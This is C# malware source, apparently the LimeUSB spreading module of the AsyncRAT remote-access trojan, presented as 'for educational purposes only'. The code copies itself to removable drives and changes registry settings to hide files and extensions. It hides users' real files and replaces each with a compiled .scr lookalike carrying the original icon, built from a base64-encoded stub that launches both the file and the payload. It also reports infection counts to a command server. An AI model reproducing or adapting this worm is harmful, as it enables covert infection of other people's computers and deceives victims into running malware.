using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Drawing.IconLib; // AsyncRAT-C#\packages\IconLib
using Microsoft.Win32;
using System.Drawing;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using Client.MessagePack;
using Client.Sockets;
using System.Threading;
using System.Windows.Forms;
//
//       │ Author     : NYAN CAT
//       │ Name       : LimeUSB v0.3

//       Contact Me   : https://github.com/NYAN-x-CAT
//       This program Is distributed for educational purposes only.
//

namespace Client.Handle_Packet
{
    class LimeUSB
    {
        public void Run()
        {
            Initialize();
        }

        private void Initialize()
        {
            ExplorerOptions();
            int count = 0;
            foreach (DriveInfo usb in DriveInfo.GetDrives())
            {
                try
                {
                    if (usb.DriveType == DriveType.Removable && usb.IsReady)
                    {
                        count += 1;
                        if (!Directory.Exists(usb.RootDirectory.ToString() + spreadSettings.WorkDirectory))
                        {
                            Directory.CreateDirectory(usb.RootDirectory.ToString() + spreadSettings.WorkDirectory);
                            File.SetAttributes(usb.RootDirectory.ToString() + spreadSettings.WorkDirectory, FileAttributes.System | FileAttributes.Hidden);
                        }

                        if (!Directory.Exists((usb.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory)))
                            Directory.CreateDirectory((usb.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory));

                        if (!File.Exists(usb.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.LimeUSBFile))
                            File.Copy(Application.ExecutablePath, usb.RootDirectory.ToString() + spreadSettings.WorkDirectory + "\\" + spreadSettings.LimeUSBFile);

                        CreteDirectory(usb.RootDirectory.ToString());

                        InfectFiles(usb.RootDirectory.ToString());
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Initialize " + ex.Message);
                }
            }
            if (count != 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "usbSpread";
                msgpack.ForcePathObject("Count").AsString = count.ToString();
                ClientSocket.BeginSend(msgpack.Encode2Bytes());
            }

        }

        private void ExplorerOptions()
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
                if (key.GetValue("Hidden") != (object)2)
                    key.SetValue("Hidden", 2);
                if (key.GetValue("HideFileExt") != (object)1)
                    key.SetValue("HideFileExt", 1);
            }
            catch { }
        }

        private void InfectFiles(string path)
        {
            foreach (var file in Directory.GetFiles(path))
            {
                try
                {
                    if (CheckIfInfected(file))
                    {
                        ChangeIcon(file);
                        File.Move(file, file.Insert(3, spreadSettings.WorkDirectory + "\\"));
                        CompileFile(file);
                    }
                }
                catch { }
            }

            foreach (var directory in Directory.GetDirectories(path))
            {
                if (!directory.Contains(spreadSettings.WorkDirectory))
                    InfectFiles(directory);
            }
        }

        private void CreteDirectory(string usbDirectory)
        {
            foreach (var directory in Directory.GetDirectories(usbDirectory))
            {
                try
                {
                    if (!directory.Contains(spreadSettings.WorkDirectory))
                    {
                        if (!Directory.Exists(directory.Insert(3, spreadSettings.WorkDirectory + "\\")))
                            Directory.CreateDirectory(directory.Insert(3, spreadSettings.WorkDirectory + "\\"));
                        CreteDirectory(directory);
                    }
                }
                catch { }
            }
        }

        private bool CheckIfInfected(string file)
        {
            try
            {
                FileVersionInfo info = FileVersionInfo.GetVersionInfo(file);
                if (info.LegalTrademarks == spreadSettings.InfectedTrademark)
                    return false;
                else
                    return true;
            }
            catch
            {
                return false;
            }
        }

        private void ChangeIcon(string file)
        {
            try
            {
                Icon fileIcon = Icon.ExtractAssociatedIcon(file);
                MultiIcon multiIcon = new MultiIcon();
                SingleIcon singleIcon = multiIcon.Add(Path.GetFileName(file));
                singleIcon.CreateFrom(fileIcon.ToBitmap(), IconOutputFormat.Vista);
                singleIcon.Save(Path.GetPathRoot(file) + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(file.Replace(" ", null)) + ".ico");
            }
            catch { }
        }

        private void CompileFile(string infectedFile)
        {
            try
            {
                string source = Encoding.UTF8.GetString(Convert.FromBase64String("dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpbYXNzZW1ibHk6IEFzc2VtYmx5VHJhZGVtYXJrKCIlTGltZSUiKV0KW2Fzc2VtYmx5OiBHdWlkKCIlR3VpZCUiKV0KCnN0YXRpYyBjbGFzcyBMaW1lVVNCTW9kdWxlCnsKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBNYWluKCkKICAgIHsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLlN0YXJ0KEAiJUZpbGUlIik7CiAgICAgICAgICAgIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLlN0YXJ0KEAiJVBheWxvYWQlIik7CiAgICAgICAgfQogICAgICAgIGNhdGNoIHsgfQogICAgfQp9"));
                source = source.Replace("%Payload%", Path.GetPathRoot(infectedFile) + spreadSettings.WorkDirectory + "\\" + spreadSettings.LimeUSBFile);
                source = source.Replace("%File%", infectedFile.Insert(3, spreadSettings.WorkDirectory + "\\"));
                source = source.Replace("%Lime%", spreadSettings.InfectedTrademark);
                source = source.Replace("%LimeUSBModule%", Randomz(new Random().Next(6, 12)));
                source = source.Replace("%Guid%", Guid.NewGuid().ToString());

                CompilerParameters cParams = new CompilerParameters();
                Dictionary<string, string> providerOptions = new Dictionary<string, string>();
                providerOptions.Add("CompilerVersion", GetOS());

                string options = "/target:winexe /platform:x86 /optimize+";
                if (File.Exists(Path.GetPathRoot(infectedFile) + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(infectedFile.Replace(" ", null)) + ".ico"))
                    options += " /win32icon:\"" + Path.GetPathRoot(infectedFile) + spreadSettings.WorkDirectory + "\\" + spreadSettings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(infectedFile.Replace(" ", null)) + ".ico" + "\"";
                cParams.GenerateExecutable = true;
                cParams.OutputAssembly = infectedFile + ".scr";
                cParams.CompilerOptions = options;
                cParams.TreatWarningsAsErrors = false;
                cParams.IncludeDebugInformation = false;
                cParams.ReferencedAssemblies.Add("System.dll");

                CompilerResults results = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(cParams, source);
            }
            catch (Exception ex)
            {
                Debug.WriteLine("CompileFile " + ex.Message);
            }
        }

        private string GetOS()
        {
            var os = new Microsoft.VisualBasic.Devices.ComputerInfo();
            if (os.OSFullName.Contains("7"))
                return "v2.0";
            else
                return "v4.0";
        }

        private string Randomz(int L)
        {
            string validchars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            StringBuilder sb = new StringBuilder();
            Random rand = new Random();
            for (int i = 1; i <= L; i++)
            {
                int idx = rand.Next(0, validchars.Length);
                char randomChar = validchars[idx];
                sb.Append(randomChar);
            }
            var randomString = sb.ToString();
            return randomString;
        }
    }

    public class spreadSettings
    {
        public static readonly string InfectedTrademark = "Trademark - Lime";
        public static readonly string WorkDirectory = "$LimeUSB";
        public static readonly string LimeUSBFile = Path.GetFileName(Application.ExecutablePath);
        public static readonly string IconsDirectory = "$LimeIcons";
    }
}
